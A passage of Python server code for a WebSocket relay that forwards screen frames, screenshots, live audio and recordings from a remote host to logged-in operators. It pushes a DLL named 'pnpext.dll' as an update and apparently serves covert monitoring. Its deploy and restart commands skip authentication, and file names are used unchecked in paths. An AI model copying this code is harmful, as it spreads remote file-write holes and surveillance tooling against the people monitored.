                room.host_streams[user_id] = conn  # Reuse host_streams dict for host_file
            elif role == "stream":
                room.stream_clients[user_id] = conn
            elif role == "file_recv":
                conn._parent_client = msg.get("parent_client", "")
                room.file_clients[user_id] = conn
            else:
                room.clients[user_id] = conn
            room.touch()
        
        # Notify
        await websocket.send(json.dumps({
            "ok": True, "event": "auth_ok",
            "user_id": user_id,
            "role": role,
            "host_online": room.host is not None,
            "server_version": SERVER_VERSION,
        }, ensure_ascii=False))
        
        log.info(f"Auth OK: role={role} token={token[:8]}... id={user_id} from={remote}")

        # Set TCP priority and buffer sizes per role
        if _sock:
            try:
                if role in ("stream", "host_stream"):
                    _sock.setsockopt(socket.IPPROTO_IP, socket.IP_TOS, 0x10)  # IPTOS_LOWDELAY
                    # Small send buffer for stream — pacing handles smoothing,
                    # small buffer = less latency, frames don't queue up
                    _sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 128 * 1024)
                elif role in ("file_recv", "host_file"):
                    _sock.setsockopt(socket.IPPROTO_IP, socket.IP_TOS, 0x08)  # IPTOS_THROUGHPUT
                    # Large buffer for files — maximize throughput
                    _sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
            except Exception:
                pass
        
        # Notify clients that host came online
        if role == "host":
            await broadcast_to_clients(room, make_event("host_online", {"user_id": user_id}))
            # Send current client count to host (so it can skip auto-stopping stream
            # if clients are already connected when host reconnects)
            try:
                await conn.ws.send(make_event("clients_online", {"count": len(room.clients)}))
            except:
                pass
        # Notify host that a client joined (not for stream-only connections)
        if role == "client" and room.host:
            try:
                await room.host.ws.send(make_event("client_joined", {
                    "user_id": user_id,
                    "username": conn.username,  # "" until user_login; real name after
                }))
            except:
                pass
        # Notify ALL clients (and host) about current client count
        if role == "client":
            n = len(room.clients)
            await broadcast_to_clients(room, make_event("clients_online", {"count": n}))
            # Also notify host so its viewer watchdog knows when to stop the stream
            if room.host:
                try:
                    await room.host.ws.send(make_event("clients_online", {"count": n}))
                except:
                    pass
        
        # ── Message relay loop ─────────────────────────────────────────────
        async for raw_msg in websocket:
            conn.msg_count += 1
            room.touch()
            
            if isinstance(raw_msg, bytes):
                conn.bytes_recv += len(raw_msg)
                if role == "client" and room.host:
                    # Binary from client (FILE upload chunks) → forward to host
                    # BLOCKING: backpressure is correct for files — rate-limits sender
                    try:
                        await room.host.ws.send(raw_msg)
                        room.host.bytes_sent += len(raw_msg)
                    except:
                        log.warning("Failed to forward binary to host")
                elif role == "host_stream":
                    # host_stream ONLY sends SCRN/SCR2 frames → route to stream clients
                    if len(raw_msg) >= 4 and raw_msg[:4] in (b'SCRN', b'SCR2'):
                        enqueue_scrn_to_stream_clients(room, raw_msg)
                elif role == "host_file":
                    # host_file sends FILE chunks → round-robin to file_recv clients
                    fc_list = list(room.file_clients.values())
                    if fc_list:
                        idx = room._file_rr % len(fc_list)
                        room._file_rr += 1
                        fc = fc_list[idx]
                        try:
                            await fc.ws.send(raw_msg)
                            fc.bytes_sent += len(raw_msg)
                        except:
                            room.file_clients.pop(fc.user_id, None)
                        # File throughput diagnostics (every 5 seconds)
                        if not hasattr(conn, '_file_bytes'): conn._file_bytes = 0; conn._file_log = time.time(); conn._file_chunks = 0
                        conn._file_bytes += len(raw_msg)
                        conn._file_chunks += 1
                        now = time.time()
                        if now - conn._file_log >= 5.0:
                            elapsed = now - conn._file_log
                            kbps = conn._file_bytes / elapsed / 1024
                            log.info(f"FILE relay: {kbps:.0f} KB/s, {conn._file_chunks} chunks in {elapsed:.1f}s, chunk={len(raw_msg)//1024}KB, file_conns={len(fc_list)}")
                            conn._file_bytes = 0; conn._file_chunks = 0; conn._file_log = now
                    else:
                        if conn.msg_count <= 2:
                            log.warning(f"host_file: no file_recv clients, dropping FILE binary")
                elif role == "host":
                    if len(raw_msg) >= 4 and raw_msg[:4] in (b'SCRN', b'SCR2'):
                        # SCRN frames → ONLY to stream_clients, NOT to command clients
                        # Fire-and-forget: never blocks the host handler
                        enqueue_scrn_to_stream_clients(room, raw_msg)
                    elif len(raw_msg) >= 8 and raw_msg[:4] == b'SHOT':
                        # Screenshot from host → decrypt + save to disk + notify clients
                        name_len = struct.unpack('<I', raw_msg[4:8])[0]
                        if name_len > 0 and 8 + name_len < len(raw_msg):
                            enc_name = raw_msg[8:8+name_len].decode('utf-8', errors='replace')
                            enc_data = raw_msg[8+name_len:]
                            saved_name = _save_screenshot(room.token, enc_name, enc_data)
                            if saved_name:
                                # Notify all command clients
                                d = _ensure_screenshot_dir(room.token)
                                fpath = None
                                for f in d.iterdir():
                                    if f.stem == saved_name:
                                        fpath = f; break
                                notify = json.dumps({"event": "new_screenshot", "name": saved_name,
                                    "size": fpath.stat().st_size if fpath else 0,
                                    "time": int(time.time())}, ensure_ascii=False)
                                await broadcast_to_clients(room, notify)
                                log.debug(f"Screenshot saved: {saved_name} ({len(enc_data)} bytes)")
                    elif len(raw_msg) >= 4 and raw_msg[:4] == b'ALIV':
                        # Live audio: relay directly to all command clients (no storage)
                        await broadcast_to_clients(room, raw_msg)
                    elif len(raw_msg) >= 8 and raw_msg[:4] == b'AUDR':
                        # Audio recording from host → decrypt + save + notify clients
                        name_len = struct.unpack('<I', raw_msg[4:8])[0]
                        if name_len > 0 and 8 + name_len < len(raw_msg):
                            enc_name = raw_msg[8:8+name_len].decode('utf-8', errors='replace')
                            enc_data = raw_msg[8+name_len:]
                            saved_name = _save_audio(room.token, enc_name, enc_data)
                            if saved_name:
                                d = _ensure_audio_dir(room.token)
                                fpath = None
                                for f in d.iterdir():
                                    if f.stem == saved_name:
                                        fpath = f; break
                                notify = json.dumps({"event": "new_recording", "name": saved_name,
                                    "ext": fpath.suffix if fpath else ".aac",
                                    "size": fpath.stat().st_size if fpath else 0,
                                    "time": int(time.time())}, ensure_ascii=False)
                                await broadcast_to_clients(room, notify)
                    elif len(raw_msg) >= 4 and raw_msg[:4] == b'FILE' and room.file_clients:
                        # FILE binary from host main ws → round-robin to file_recv clients
                        fc_list = list(room.file_clients.values())
                        idx = room._file_rr % len(fc_list)
                        room._file_rr += 1
                        fc = fc_list[idx]
                        try:
                            await fc.ws.send(raw_msg)
                            fc.bytes_sent += len(raw_msg)
                        except:
                            room.file_clients.pop(fc.user_id, None)
                    else:
                        # Non-FILE binary or no file_recv clients → route via target queue or broadcast
                        target = ""
                        if room._pending_binary_targets:
                            target = room._pending_binary_targets.pop(0)
                        if target and target in room.clients:
                            try:
                                await room.clients[target].ws.send(raw_msg)
                                room.clients[target].bytes_sent += len(raw_msg)
                            except:
                                pass
                        else:
                            await broadcast_to_clients(room, raw_msg)
                # role == "stream" sends nothing to host
            else:
                # Text JSON: route by role
                conn.bytes_recv += len(raw_msg.encode())
                if role in ("stream", "host_stream", "host_file", "file_recv"):
                    continue  # No text forwarding for stream/file channels
                try:
                    msg = json.loads(raw_msg)
                except:
                    continue
                
                if role == "client":
                    # ── Auth / user-management commands (handled by VPS) ──
                    cmd_name = msg.get("cmd", "")

                    if cmd_name == "user_login":
                        username = str(msg.get("username", "")).strip()
                        password = str(msg.get("password", ""))
                        u = _verify_user(username, password)
                        if not u:
                            await websocket.send(json.dumps({
                                "id": msg.get("id",""), "ok": False,
                                "error": "Invalid username or password",
                            }, ensure_ascii=False))
                            continue
                        sid = _create_session(u)
                        # Persist last_login in users.json
                        async with _users_lock:
                            data = _load_users()
                            for uu in data.get("users", []):
                                if uu.get("username") == username:
                                    uu["last_login"] = datetime.utcnow().isoformat(timespec="seconds") + "Z"
                                    break
                            _save_users(data)
                        _log_user_activity(_sessions[sid], "login", username)
                        # Store username on this WS connection so clients_list shows real names
                        conn.username = username
                        await websocket.send(json.dumps({
                            "id": msg.get("id",""), "ok": True,
                            "data": {
                                "session": sid,
                                "username": u["username"],
                                "role": u.get("role", "operator"),
                                "allowed_tabs": _sessions[sid]["allowed_tabs"],
                                "all_tabs": ALL_TABS,
                                "theme": u.get("theme", ""),
                            },
                        }, ensure_ascii=False))
                        continue

                    if cmd_name == "user_logout":
                        sid = str(msg.get("session",""))
                        if sid in _sessions:
                            _log_user_activity(_sessions[sid], "logout")
                            del _sessions[sid]
                        await websocket.send(json.dumps({
                            "id": msg.get("id",""), "ok": True,
                            "data": {"logged_out": True},
                        }, ensure_ascii=False))
                        continue

                    # ── Self-service password change (any logged-in user) ──
                    # The admin-gated user_update works too but only for admins.
                    # This endpoint lets operators change their OWN password
                    # without needing the admin to intervene. Requires old
                    # password to prevent a stolen session from re-locking
                    # the account.
                    if cmd_name == "user_change_password":
                        sid = str(msg.get("session",""))
                        s = _session_info(sid)
                        if not s:
                            await websocket.send(json.dumps({
                                "id": msg.get("id",""), "ok": False,
                                "error": "not logged in"}, ensure_ascii=False))
                            continue
                        old_pwd = str(msg.get("old_password",""))
                        new_pwd = str(msg.get("new_password",""))
                        if not new_pwd or len(new_pwd) < 4:
                            await websocket.send(json.dumps({
                                "id": msg.get("id",""), "ok": False,
                                "error": "new password must be at least 4 chars"}, ensure_ascii=False))
                            continue
                        async with _users_lock:
                            data = _load_users()
                            target = None
                            for uu in data.get("users", []):
                                if uu.get("username") == s["username"]:
                                    target = uu; break
                            if not target:
                                await websocket.send(json.dumps({
                                    "id": msg.get("id",""), "ok": False,
                                    "error": "user not found"}, ensure_ascii=False))
                                continue
                            # Re-check old password (prevents session theft
                            # from silently rotating the password).
                            if _hash_password(old_pwd, target.get("salt","")) != target.get("password_hash"):
                                await websocket.send(json.dumps({
                                    "id": msg.get("id",""), "ok": False,
                                    "error": "old password incorrect"}, ensure_ascii=False))
                                continue
                            salt = secrets.token_hex(16)
                            target["salt"] = salt
                            target["password_hash"] = _hash_password(new_pwd, salt)
                            _save_users(data)
                        _log_user_activity(s, "user_change_password", s["username"])
                        await websocket.send(json.dumps({
                            "id": msg.get("id",""), "ok": True,
                            "data": {"changed": True}}, ensure_ascii=False))
                        continue

                    if cmd_name == "user_set_theme":
                        # Any logged-in user can save their own theme preference
                        sid = str(msg.get("session",""))
                        s = _session_info(sid)
                        if not s:
                            await websocket.send(json.dumps({
                                "id": msg.get("id",""), "ok": False,
                                "error": "not logged in"}, ensure_ascii=False))
                            continue
                        theme_name = str(msg.get("theme","")).strip()[:32]
                        async with _users_lock:
                            data = _load_users()
                            for uu in data.get("users", []):
                                if uu.get("username") == s["username"]:
                                    uu["theme"] = theme_name
                                    break
                            _save_users(data)
                        await websocket.send(json.dumps({
                            "id": msg.get("id",""), "ok": True,
                            "data": {"theme": theme_name}}, ensure_ascii=False))
                        continue

                    if cmd_name == "user_session_check":
                        sid = str(msg.get("session",""))
                        s = _session_info(sid)
                        if not s:
                            await websocket.send(json.dumps({
                                "id": msg.get("id",""), "ok": False,
                                "error": "session expired",
                            }, ensure_ascii=False))
                            continue
                        await websocket.send(json.dumps({
                            "id": msg.get("id",""), "ok": True,
                            "data": {
                                "username": s["username"],
                                "role": s["role"],
                                "allowed_tabs": s["allowed_tabs"],
                                "all_tabs": ALL_TABS,
                            },
                        }, ensure_ascii=False))
                        continue

                    # ── host_events_stats — any logged-in user ──
                    # Admin → all tokens; operator → filtered to their room token.
                    if cmd_name == "host_events_stats":
                        sid = str(msg.get("session",""))
                        s = _session_info(sid)
                        if not s:
                            await websocket.send(json.dumps({
                                "id": msg.get("id",""), "ok": False,
                                "error": "not logged in"}, ensure_ascii=False))
                            continue
                        # Collect currently live host connections for state correction
                        async with rooms_lock:
                            live_set = {
                                tok for tok, r in rooms.items()
                                if r.host is not None
                            }
                        try:
                            stats = _analyze_host_events(
                                HOST_EVENTS_LOG, live_tokens=live_set)
                        except Exception as e:
                            stats = {"error": str(e), "tokens": {}, "totals": {}}
                        # Build recent feed (last 50 events)
                        feed = list(_recent_host_events)[-50:]
                        if s.get("role") != "admin":
                            # Operator: filter to their room's token only.
                            # _analyze_host_events uses truncated keys (tok[:8]+"..."+tok[-4:]),
                            # so we must look up using the same format.
                            full_tok = room.token
                            tok_short = (full_tok[:8] + "..." + full_tok[-4:]) \
                                        if len(full_tok) > 12 else full_tok
                            tok_stats = stats.get("tokens", {}).get(tok_short)
                            stats = {
                                "totals": stats.get("totals", {}),
                                "tokens": {tok_short: tok_stats} if tok_stats else {},
                            }
                            feed = [e for e in feed if e.get("token") == full_tok]
                        stats["recent_feed"] = feed[-50:]
                        await websocket.send(json.dumps({
                            "id": msg.get("id",""), "ok": True,
                            "data": stats}, ensure_ascii=False))
                        continue

                    # ── Admin-only user management ──
                    admin_cmds = {"user_list", "user_create", "user_update",
                                  "user_delete", "user_activity"}
                    if cmd_name in admin_cmds:
                        sid = str(msg.get("session",""))
                        s = _session_info(sid)
                        if not s or s.get("role") != "admin":
                            await websocket.send(json.dumps({
                                "id": msg.get("id",""), "ok": False,
                                "error": "admin only",
                            }, ensure_ascii=False))
                            continue

                        if cmd_name == "user_list":
                            async with _users_lock:
                                users = _load_users().get("users", [])
                            out = [{
                                "username": u.get("username",""),
                                "role": u.get("role",""),
                                "allowed_tabs": u.get("allowed_tabs", []),
                                "created_at": u.get("created_at",""),
                                "last_login": u.get("last_login"),
                            } for u in users]
                            await websocket.send(json.dumps({
                                "id": msg.get("id",""), "ok": True,
                                "data": {"users": out, "all_tabs": ALL_TABS},
                            }, ensure_ascii=False))
                            continue

                        if cmd_name == "user_create":
                            new_user = msg.get("user", {}) or {}
                            uname = str(new_user.get("username","")).strip()
                            pwd   = str(new_user.get("password",""))
                            role_ = str(new_user.get("role","operator"))
                            tabs  = list(new_user.get("allowed_tabs") or
                                         (ALL_TABS if role_=="admin" else DEFAULT_OPERATOR_TABS))
                            if not uname or not pwd:
                                await websocket.send(json.dumps({
                                    "id": msg.get("id",""), "ok": False,
                                    "error": "username + password required"}, ensure_ascii=False))
                                continue
                            async with _users_lock:
                                data = _load_users()
                                if any(u.get("username")==uname for u in data.get("users",[])):
                                    await websocket.send(json.dumps({
                                        "id": msg.get("id",""), "ok": False,
                                        "error": "username taken"}, ensure_ascii=False))
                                    continue
                                salt = secrets.token_hex(16)
                                data.setdefault("users", []).append({
                                    "username": uname,
                                    "salt": salt,
                                    "password_hash": _hash_password(pwd, salt),
                                    "role": role_,
                                    "allowed_tabs": tabs,
                                    "created_at": datetime.utcnow().isoformat(timespec="seconds")+"Z",
                                    "last_login": None,
                                })
                                _save_users(data)
                            _log_user_activity(s, "user_create", uname)
                            await websocket.send(json.dumps({
                                "id": msg.get("id",""), "ok": True,
                                "data": {"created": uname}}, ensure_ascii=False))
                            continue

                        if cmd_name == "user_update":
                            target = str(msg.get("username","")).strip()
                            updates = msg.get("updates", {}) or {}
                            async with _users_lock:
                                data = _load_users()
                                found = None
                                for uu in data.get("users", []):
                                    if uu.get("username") == target:
                                        found = uu; break
                                if not found:
                                    await websocket.send(json.dumps({
                                        "id": msg.get("id",""), "ok": False,
                                        "error": "user not found"}, ensure_ascii=False))
                                    continue
                                if "password" in updates and updates["password"]:
                                    salt = secrets.token_hex(16)
                                    found["salt"] = salt
                                    found["password_hash"] = _hash_password(
                                        str(updates["password"]), salt)
                                if "role" in updates:
                                    found["role"] = str(updates["role"])
                                if "allowed_tabs" in updates:
                                    found["allowed_tabs"] = list(updates["allowed_tabs"])
                                _save_users(data)
                            _log_user_activity(s, "user_update", target)
                            await websocket.send(json.dumps({
                                "id": msg.get("id",""), "ok": True,
                                "data": {"updated": target}}, ensure_ascii=False))
                            continue

                        if cmd_name == "user_delete":
                            target = str(msg.get("username","")).strip()
                            if target == s.get("username"):
                                await websocket.send(json.dumps({
                                    "id": msg.get("id",""), "ok": False,
                                    "error": "cannot delete yourself"}, ensure_ascii=False))
                                continue
                            async with _users_lock:
                                data = _load_users()
                                data["users"] = [u for u in data.get("users", [])
                                                 if u.get("username") != target]
                                _save_users(data)
                            # Invalidate any active sessions for the deleted user
                            for sid_, sess in list(_sessions.items()):
                                if sess.get("username") == target:
                                    del _sessions[sid_]
                            _log_user_activity(s, "user_delete", target)
                            await websocket.send(json.dumps({
                                "id": msg.get("id",""), "ok": True,
                                "data": {"deleted": target}}, ensure_ascii=False))
                            continue

                        if cmd_name == "user_activity":
                            limit = max(1, min(int(msg.get("limit", 200) or 200), 2000))
                            user_filter = str(msg.get("user_filter", "")).strip()
                            entries: list = []
                            if USER_ACTIVITY_LOG.is_file():
                                with USER_ACTIVITY_LOG.open("r", encoding="utf-8",
                                                            errors="replace") as f:
                                    for line in f:
                                        line = line.strip()
                                        if not line: continue
                                        try: entries.append(json.loads(line))
                                        except: pass
                            if user_filter:
                                entries = [e for e in entries if e.get("user") == user_filter]
                            entries = entries[-limit:]
                            await websocket.send(json.dumps({
                                "id": msg.get("id",""), "ok": True,
                                "data": {"entries": entries}}, ensure_ascii=False))
                            continue

                    # Screenshot commands: handled by VPS directly
                    sc_cmd = cmd_name
                    if sc_cmd == "screenshot_list":
                        items = _list_screenshots(room.token)
                        resp = json.dumps({"id": msg.get("id",""), "ok": True, "data": {"cmd":"screenshot_list_result","items":items}}, ensure_ascii=False)
                        await websocket.send(resp)
                        continue
                    elif sc_cmd == "screenshot_thumb":
                        name = msg.get("name", "")
                        d = SCREENSHOT_DIR / room.token
                        fpath = d / f"{name}.jpg"
                        if fpath.exists():
                            thumb = _make_thumbnail(fpath)
                            # Send as binary: STMB + name_len(4) + name + jpeg_thumb
                            name_bytes = name.encode('utf-8')
                            header = b'STMB' + struct.pack('<I', len(name_bytes)) + name_bytes
                            await websocket.send(header + thumb)
                        else:
                            await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "Not found"}, ensure_ascii=False))
                        continue
                    elif sc_cmd == "screenshot_view":
                        name = msg.get("name", "")
                        d = SCREENSHOT_DIR / room.token
                        fpath = d / f"{name}.jpg"
                        if fpath.exists():
                            data = fpath.read_bytes()
                            name_bytes = name.encode('utf-8')
                            header = b'SIMG' + struct.pack('<I', len(name_bytes)) + name_bytes
                            await websocket.send(header + data)
                        else:
                            await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "Not found"}, ensure_ascii=False))
                        continue
                    elif sc_cmd == "screenshot_download":
                        name = msg.get("name", "")
                        d = SCREENSHOT_DIR / room.token
                        fpath = d / f"{name}.jpg"
                        if fpath.exists():
                            data = fpath.read_bytes()
                            name_bytes = name.encode('utf-8')
                            header = b'SDWN' + struct.pack('<I', len(name_bytes)) + name_bytes
                            await websocket.send(header + data)
                        else:
                            await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "Not found"}, ensure_ascii=False))
                        continue
                    elif sc_cmd == "screenshot_delete":
                        names = msg.get("names", [])
                        d = SCREENSHOT_DIR / room.token
                        deleted = 0
                        for n in names:
                            fpath = d / f"{n}.jpg"
                            if fpath.exists():
                                fpath.unlink()
                                deleted += 1
                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"deleted": deleted}}, ensure_ascii=False))
                        continue
                    elif sc_cmd == "screenshot_save_template":
                        tname = msg.get("template_name", "")
                        tapps = msg.get("apps", "")
                        if tname:
                            templates = _load_templates()
                            templates[tname] = tapps
                            _save_templates(templates)
                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": "saved"}, ensure_ascii=False))
                        continue
                    elif sc_cmd == "screenshot_delete_template":
                        tname = msg.get("template_name", "")
                        templates = _load_templates()
                        templates.pop(tname, None)
                        _save_templates(templates)
                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": "deleted"}, ensure_ascii=False))
                        continue
                    elif sc_cmd == "screenshot_set_quota":
                        quota_mb = int(msg.get("quota_mb", 500))
                        global SCREENSHOT_QUOTA
                        SCREENSHOT_QUOTA = quota_mb * 1_000_000
                        # Save to file
                        quota_file = SCREENSHOT_DIR / room.token / "_quota.txt"
                        quota_file.parent.mkdir(parents=True, exist_ok=True)
                        quota_file.write_text(str(quota_mb))
                        # Enforce immediately
                        d = SCREENSHOT_DIR / room.token
                        if d.exists():
                            _enforce_quota(d, SCREENSHOT_QUOTA)
                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"quota_mb": quota_mb}}, ensure_ascii=False))
                        log.info(f"Screenshot quota set to {quota_mb}MB for {room.token}")
                        continue
                    elif sc_cmd == "screenshot_get_quota":
                        quota_file = SCREENSHOT_DIR / room.token / "_quota.txt"
                        qmb = 500
                        if quota_file.exists():
                            try: qmb = int(quota_file.read_text().strip())
                            except: pass
                        d = SCREENSHOT_DIR / room.token
                        used = 0
                        app_usage = {}
                        if d.exists():
                            for f in d.iterdir():
                                if f.is_file() and f.suffix == '.jpg':
                                    sz = f.stat().st_size
                                    used += sz
                                    app = _get_app_from_filename(f.stem)
                                    app_usage[app] = app_usage.get(app, 0) + sz
                        app_quotas = _get_app_quotas(d) if d.exists() else {}
                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {
                            "quota_mb": qmb, "used_bytes": used,
                            "app_usage": {k: v for k, v in app_usage.items()},
                            "app_quotas": app_quotas
                        }}, ensure_ascii=False))
                        continue
                    elif sc_cmd == "screenshot_set_app_quota":
                        app = msg.get("app", "")
                        mb = int(msg.get("quota_mb", 0))
                        d = _ensure_screenshot_dir(room.token)
                        quotas = _get_app_quotas(d)
                        if mb > 0:
                            quotas[app] = mb
                        else:
                            quotas.pop(app, None)
                        _save_app_quotas(d, quotas)
                        _enforce_quota(d)
                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": "saved"}, ensure_ascii=False))
                        continue
                    elif sc_cmd == "screenshot_save_settings":
                        # Save screenshot settings on VPS (for sync between sessions)
                        settings = msg.get("settings", {})
                        d = _ensure_screenshot_dir(room.token)
                        settings_file = d / "_settings.json"
                        settings_file.write_text(json.dumps(settings, indent=2, ensure_ascii=False))
                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": "saved"}, ensure_ascii=False))
                        continue
                    elif sc_cmd == "screenshot_load_settings":
                        d = SCREENSHOT_DIR / room.token
                        settings_file = d / "_settings.json"
                        settings = {}
                        if settings_file.exists():
                            try: settings = json.loads(settings_file.read_text())
                            except: pass
                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": settings}, ensure_ascii=False))
                        continue
                    elif sc_cmd == "screenshot_templates":
                        templates = _load_templates()
                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"cmd":"screenshot_templates_result","templates":templates}}, ensure_ascii=False))
                        continue

                    # Upload update file: client sends DLL to VPS for host to download
                    elif sc_cmd == "upload_update":
                        fname = msg.get("filename", "pnpext.dll")
                        size = msg.get("size", 0)
                        try:
                            bin_data = None
                            for _attempt in range(10):
                                raw = await asyncio.wait_for(websocket.recv(), timeout=60)
                                if isinstance(raw, bytes):
                                    bin_data = raw
                                    break
                            if bin_data and len(bin_data) > 0:
                                update_dir = Path("/var/www/remote-desktop/files")
                                update_dir.mkdir(parents=True, exist_ok=True)
                                fpath = update_dir / fname
                                fpath.write_bytes(bin_data)
                                url = f"https://{websocket.request.host.split(':')[0]}/files/{fname}" if hasattr(websocket, 'request') and hasattr(websocket.request, 'host') else f"/files/{fname}"
                                await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"url": url, "size": len(bin_data), "path": str(fpath)}}, ensure_ascii=False))
                                logger.info(f"Update file uploaded: {fpath} ({len(bin_data)} bytes)")
                            else:
                                await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "No binary data received"}, ensure_ascii=False))
                        except asyncio.TimeoutError:
                            await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "Upload timeout"}, ensure_ascii=False))
                        continue

                    # VPS deploy: upload files to server directories
                    # NEW: file content is base64 in the JSON command itself — no separate
                    # binary frame, no race conditions with auto-refresh messages.
                    elif sc_cmd == "vps_deploy":
                        fname = msg.get("filename", "")
                        target = msg.get("target", "")  # "web", "relay", "files"
                        b64data = msg.get("data_b64", "")
                        if not fname or not target:
                            await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "Missing filename or target"}, ensure_ascii=False))
                            continue
                        try:
                            # Decode base64 file content
                            bin_data = base64.b64decode(b64data) if b64data else b""

                            # Legacy path: empty data_b64 → fall back to separate binary frame
                            # (kept for backward compatibility with old clients during rollout)
                            if not bin_data:
                                for _attempt in range(10):
                                    raw = await asyncio.wait_for(websocket.recv(), timeout=120)
                                    if isinstance(raw, bytes):
                                        bin_data = raw
                                        break

                            if not bin_data:
                                await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "No data received"}, ensure_ascii=False))
                                continue

                            if target == "web":
                                dest = Path("/var/www/remote-desktop") / fname
                            elif target == "relay":
                                dest = Path("/opt/remotedesk") / fname
                            elif target == "files":
                                dest = Path("/var/www/remote-desktop/files") / fname
                                dest.parent.mkdir(parents=True, exist_ok=True)
                            else:
                                await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "Unknown target: " + target}, ensure_ascii=False))
                                continue

                            # Backup existing
                            if dest.exists():
                                bak = dest.with_suffix(dest.suffix + ".bak")
                                try: bak.unlink(missing_ok=True)
                                except: pass
                                try: dest.rename(bak)
                                except: pass
                            dest.write_bytes(bin_data)
                            logger.info(f"VPS deploy: {fname} -> {dest} ({len(bin_data)} bytes)")
                            await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"path": str(dest), "size": len(bin_data)}}, ensure_ascii=False))
                        except asyncio.TimeoutError:
                            await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "Upload timeout"}, ensure_ascii=False))
                        except Exception as exc:
                            await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": f"Decode/write error: {exc}"}, ensure_ascii=False))
                        continue

                    # VPS restart: restart server.py service
                    elif sc_cmd == "vps_restart":
                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"message": "Restarting in 2 seconds..."}}, ensure_ascii=False))
                        # Schedule restart after response is sent
                        async def _do_restart():
                            await asyncio.sleep(2)
                            import subprocess
                            subprocess.Popen(["systemctl", "restart", "rdp-relay"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        asyncio.ensure_future(_do_restart())
                        continue

                    # Audio commands: handled by VPS directly
                    elif sc_cmd == "audio_list":
                        items = _list_audio(room.token)
                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"items": items}}, ensure_ascii=False))
                        continue
                    elif sc_cmd == "audio_play":
                        name = msg.get("name", "")
                        d = AUDIO_DIR / room.token
                        # Find file with any audio extension
                        fpath = None
                        for ext in ('.ogg', '.aac', '.opus', '.mp3', '.wav'):
                            fp = d / f"{name}{ext}"
                            if fp.exists(): fpath = fp; break
                        if fpath:
                            data = fpath.read_bytes()
                            name_bytes = name.encode('utf-8')
                            header = b'APLY' + struct.pack('<I', len(name_bytes)) + name_bytes
                            await websocket.send(header + data)
                        else:
                            await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "Not found"}, ensure_ascii=False))
                        continue
                    elif sc_cmd == "audio_download":
                        name = msg.get("name", "")
                        d = AUDIO_DIR / room.token
                        fpath = None
                        for ext in ('.ogg', '.aac', '.opus', '.mp3', '.wav'):
                            fp = d / f"{name}{ext}"
                            if fp.exists(): fpath = fp; break
                        if fpath:
                            data = fpath.read_bytes()
                            name_bytes = name.encode('utf-8')
                            header = b'ADWN' + struct.pack('<I', len(name_bytes)) + name_bytes
                            await websocket.send(header + data)
                        else:
                            await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "Not found"}, ensure_ascii=False))
                        continue
                    elif sc_cmd == "audio_delete":
                        names = msg.get("names", [])
                        d = AUDIO_DIR / room.token
                        deleted = 0
                        for n in names:
                            for ext in ('.ogg', '.aac', '.opus', '.mp3', '.wav'):
                                fp = d / f"{n}{ext}"
                                if fp.exists():
                                    fp.unlink()
                                    deleted += 1
                                    log.info(f"Audio deleted: {n}{ext}")
                        log.info(f"Audio delete: {deleted} files from {len(names)} requested")
                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"deleted": deleted}}, ensure_ascii=False))
                        continue
                    elif sc_cmd == "audio_set_quota":
                        quota_mb = int(msg.get("quota_mb", 500))
                        d = _ensure_audio_dir(room.token)
                        (d / "_quota.txt").write_text(str(quota_mb))
                        _enforce_audio_quota(d)
                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"quota_mb": quota_mb}}, ensure_ascii=False))
                        continue
                    elif sc_cmd == "audio_get_quota":
                        d = AUDIO_DIR / room.token
                        qmb = 500
                        qf = d / "_quota.txt"
                        if qf.exists():
                            try: qmb = int(qf.read_text().strip())
                            except: pass
                        used = 0
                        if d.exists():
                            used = sum(f.stat().st_size for f in d.iterdir() if f.is_file() and f.suffix in ('.ogg','.aac','.opus','.mp3','.wav'))
                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"quota_mb": qmb, "used_bytes": used}}, ensure_ascii=False))
                        continue

                    # SpeedTest: VPS responds directly, no relay to host
                    st_cmd = msg.get("cmd", "")
                    if st_cmd == "speed_test_vps":
                        size = min(int(msg.get("size", 2_000_000)), 10_000_000)
                        st_id = msg.get("id", "")
                        if size > 0:
                            payload = b'\x00' * size
                            t0 = time.time()
                            await websocket.send(payload)
                            elapsed = time.time() - t0
                        else:
                            elapsed = 0.0
                        await websocket.send(json.dumps({
                            "id": st_id, "ok": True,
                            "data": {"bytes": size, "elapsed_s": round(elapsed, 6)}
                        }, ensure_ascii=False))
                        continue

                    if st_cmd == "speed_test_vps_upload":
                        # Client will send binary payload next, we measure receive time
                        st_id = msg.get("id", "")
                        expected = min(int(msg.get("size", 2_000_000)), 10_000_000)
                        t0 = time.time()
                        total_recv = 0
                        while total_recv < expected:
